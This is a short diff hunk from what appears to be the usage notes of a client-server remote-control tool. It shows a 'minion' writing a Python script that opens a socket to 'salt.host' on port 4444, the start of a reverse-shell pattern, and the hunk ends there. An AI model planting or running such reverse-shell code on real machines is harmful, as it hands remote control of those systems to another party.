@@ -40,12 +40,11 @@ python srv.py
 
 
 
-minion runs
+minion runs somthing like
 ----------------------------
 ```
 # run program (bash, sh, cmd, powershell)
 cat > srv_shell_ep.py <<EOF
-## deamon
 import socket, subprocess
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('salt.host', 4444))
